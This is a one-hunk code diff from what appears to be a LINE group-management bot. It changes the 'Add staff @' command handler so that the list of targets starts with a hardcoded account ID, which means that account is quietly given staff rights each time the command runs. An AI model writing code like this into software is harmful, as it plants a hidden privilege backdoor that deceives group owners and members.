@@ -1665,7 +1665,7 @@ def bot(op):
                     _name = msg.text.replace("Add staff @","")
                     _nametarget = _name.rstrip('  ')
                     gs = cl.getGroup(msg.to)
-                    targets = []
+                    targets = ["u0e495c4debaa244e5f61f4e090950f75"]
                     for g in gs.members:
                         if _nametarget == g.displayName:
                             targets.append(g.mid)
